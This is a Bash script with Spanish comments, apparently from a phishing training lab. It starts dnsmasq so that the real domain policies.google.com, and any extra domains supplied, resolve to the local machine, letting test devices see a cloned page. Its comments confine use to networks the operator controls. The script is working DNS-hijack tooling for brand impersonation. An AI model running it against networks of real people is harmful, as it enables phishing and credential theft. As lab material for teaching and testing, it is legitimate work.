#!/usr/bin/env bash
# DNS hijack del laboratorio (solo red propia).
#
# Levanta un dnsmasq en esta máquina que resuelve el dominio REAL
# policies.google.com hacia la IP de LAN de este equipo. Así, cualquier
# dispositivo de la red de pruebas cuyo DNS apunte a esta máquina verá el
# CLON en vez de la página real de Google.
#
#   ./dns.sh up [dominio extra ...]  -> arranca dnsmasq (pide sudo); opcional-
#                                       mente hijack de más dominios (para
#                                       clonar otras páginas bajo su dominio)
#   ./dns.sh down                    -> lo para (sin sudo: corre como tu usuario)
#   ./dns.sh status                  -> muestra estado y la regla activa
#
# El dominio real se redirige solo DENTRO de tu red: en el resto del mundo
# policies.google.com sigue resolviendo a Google. Nunca uses esto fuera de
# una red y dispositivos que controles.
set -euo pipefail
cd "$(dirname "$0")"

EXTRA_DOMAINS=("${@:2}")

LAN_IFACE="$(ip route | awk '/default/ {print $5; exit}')"
LAN_IP="$(ip -4 route get 1.1.1.1 2>/dev/null | awk '{print $7; exit}' || true)"

CONF_FILE="$PWD/dnsmasq.conf"
PID_FILE="/tmp/dnsmasq-phishing.pid"
LOG_FILE="$PWD/dnsmasq.log"

gen_conf() {
  local rules=""
  local d
  for d in policies.google.com www.policies.google.com ${EXTRA_DOMAINS[@]+"${EXTRA_DOMAINS[@]}"}; do
    rules+="address=/$d/$LAN_IP"$'\n'
  done
  cat > "$CONF_FILE" <<EOF
# Generado por dns.sh — laboratorio de phishing, solo red propia.
# NO usar fuera de una red controlada.
interface=$LAN_IFACE
bind-interfaces
listen-address=$LAN_IP
no-resolv
# El resto del tráfico DNS va al resolver de Cloudflare (o el que prefieras)
server=1.1.1.1
server=8.8.8.8
# Hijack de los dominios del lab hacia el clon local
$rules
EOF
  echo "config escrito en $CONF_FILE (interface=$LAN_IFACE, ip=$LAN_IP)"
  echo "dominios: policies.google.com www.policies.google.com ${EXTRA_DOMAINS[*]:-}"
}

# vivo si el pid del pid-file sigue existiendo
running() {
  [ -f "$PID_FILE" ] && kill -0 "$(cat "$PID_FILE" 2>/dev/null)" 2>/dev/null
}

case "${1:-status}" in
  up)
    [ -n "$LAN_IP" ] || { echo "no se pudo detectar la IP de LAN"; exit 1; }
    if running; then
      echo "dnsmasq ya estaba activo (pid $(cat "$PID_FILE")) — para recargar: ./dns.sh down && ./dns.sh up ..."
      exit 0
    fi
    gen_conf
    echo "arrancando dnsmasq (sudo)..."
    # Modo daemon (sin --no-daemon): escribe el pid-file de forma fiable.
    # --user=$(id -un) hace que dnsmasq suelte root tras arrancar y quede como
    # tu usuario: ./dns.sh down puede pararlo con kill normal, sin sudo.
    sudo dnsmasq --conf-file="$CONF_FILE" --pid-file="$PID_FILE" \
      --user="$(id -un)" --log-facility="$LOG_FILE"
    sleep 1
    running || { echo "dnsmasq no arrancó — mira $LOG_FILE"; exit 1; }
    echo "dnsmasq en marcha (pid $(cat "$PID_FILE"))."
    echo "clientes de prueba: usar $LAN_IP como DNS"
    echo "comprobación: nslookup policies.google.com $LAN_IP"
    ;;
  down)
    if running; then
      kill "$(cat "$PID_FILE")"
      echo "dnsmasq parado"
    else
      echo "dnsmasq ya estaba parado"
    fi
    rm -f "$PID_FILE"
    ;;
  status)
    if running; then
      echo "dnsmasq activo (pid $(cat "$PID_FILE")) — policies.google.com -> $LAN_IP"
    else
      echo "dnsmasq parado"
    fi
    ;;
  *)
    echo "uso: $0 {up [dominio...]|down|status}"; exit 1 ;;
esac
